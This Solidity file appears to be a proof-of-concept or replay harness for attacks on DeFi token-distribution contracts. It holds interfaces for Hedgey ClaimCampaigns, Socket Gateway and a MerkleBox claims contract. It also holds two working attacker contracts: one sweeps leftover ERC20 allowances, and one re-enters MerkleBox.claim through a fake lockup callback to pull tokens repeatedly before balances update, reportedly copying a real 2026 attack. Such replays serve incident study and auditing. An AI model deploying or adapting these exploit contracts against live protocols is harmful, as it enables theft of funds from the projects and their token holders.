// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

/// @notice Minimal interface of Hedgey ClaimCampaigns v1 (deployed identical on ETH/ARB/OP/Base/BSC)
interface IClaimCampaigns {
    enum TokenLockup { Unlocked, Locked, Vesting }
    struct Campaign {
        address manager;
        address token;
        uint256 amount;
        uint256 end;
        TokenLockup tokenLockup;
        bytes32 root;
    }
    struct ClaimLockup {
        address tokenLocker;
        uint256 start;
        uint256 cliff;
        uint256 period;
        uint256 periods;
    }
    struct Donation {
        address tokenLocker;
        uint256 amount;
        uint256 rate;
        uint256 start;
        uint256 cliff;
        uint256 period;
    }

    function createLockedCampaign(
        bytes16 id,
        Campaign memory campaign,
        ClaimLockup memory claimLockup,
        Donation memory donation
    ) external;

    function cancelCampaign(bytes16 id) external;
}

/// @notice Attacker-controlled "tokenLocker": only needs to hold the leftover allowance and pull.
contract LockerSweeper {
    function sweep(address token, address from, uint256 amount) external {
        require(IERC20(token).transferFrom(from, msg.sender, amount), "sweep failed");
    }
}

interface ISocketGateway {
    function executeRoute(uint32 routeId, bytes calldata routeData) external payable returns (bytes memory);
    function routes(uint32 routeId) external view returns (address);
    function routesCount() external view returns (uint32);
    function disabledRouteAddress() external view returns (address);
}

interface ISocketSwapImpl {
    function performAction(
        address fromToken,
        address toToken,
        uint256 amount,
        address receiverAddress,
        bytes32 metadata,
        bytes calldata swapExtraData
    ) external payable returns (uint256);
}

interface IMerkleBox {
    struct MonthBonusInfo {
        uint8 months;
        uint32 bonus;
        uint32 minLockupRatio;
        address nft;
    }

    function newClaimsGroup(
        address erc20,
        uint256 amount,
        bytes32 merkleRoot,
        uint256 withdrawUnlockTime,
        string calldata memo,
        bool onlySelfCanClaim,
        bool lockupsTransferable,
        MonthBonusInfo[] calldata bonuses,
        address lockupContract,
        bool requireSignature,
        bytes32 signedMessage
    ) external returns (uint256);

    function claim(
        uint256 claimGroupId,
        address account,
        uint256 amount,
        bytes32[] calldata proof,
        uint8 lockupMonths,
        uint32 ratio,
        bytes calldata signature
    ) external;

    function holdings(uint256 claimGroupId)
        external
        view
        returns (
            address owner,
            address erc20,
            uint256 balance,
            bytes32 merkleRoot,
            uint256 withdrawUnlockTime,
            string memory memo,
            bool onlySelfCanClaim,
            bool lockupBonusActive,
            bool lockupsTransferable,
            address lockupContract,
            bool requireSignature,
            bytes32 signedMessage
        );

    function claimGroupCount() external view returns (uint256);
}

/// @notice Malicious lockup contract used to exercise the MerkleBox reentrancy shape.
/// It is both the claimant and the lockup contract (exactly the 2026-09-07 attack setup).
contract HemiFakeLockup {
    IMerkleBox public box;
    address public token;
    uint256 public reentered;
    uint256 public maxDepth;

    uint256 public gid;
    bytes32[] public proof;
    uint8 public months;
    uint32 public ratio;

    function configure(address _box, address _token, uint256 _maxDepth) external {
        box = IMerkleBox(_box);
        token = _token;
        maxDepth = _maxDepth;
    }

    function setClaim(uint256 _gid, bytes32[] calldata _proof, uint8 _months, uint32 _ratio) external {
        gid = _gid;
        delete proof;
        for (uint256 i; i < _proof.length; i++) proof.push(_proof[i]);
        months = _months;
        ratio = _ratio;
    }

    function attack(uint256 amount) external {
        box.claim(gid, address(this), amount, proof, months, ratio, "");
    }

    /// @notice MerkleBox approves this contract and calls createLockFor BEFORE updating accounting.
    function createLockFor(uint256 amount, uint256, address owner, bool, bool) external {
        if (reentered < maxDepth) {
            reentered++;
            box.claim(gid, address(this), amount, proof, months, ratio, "");
        }
        // Pull the approved tokens out of the MerkleBox. In the 2026 attack this repeated
        // 63 times because the holding balance had not yet been decremented. Failures on the
        // empty balance are tolerated so the replay completes and the net result can be asserted.
        try IERC20(token).transferFrom(msg.sender, owner, amount) {} catch {}
    }
}
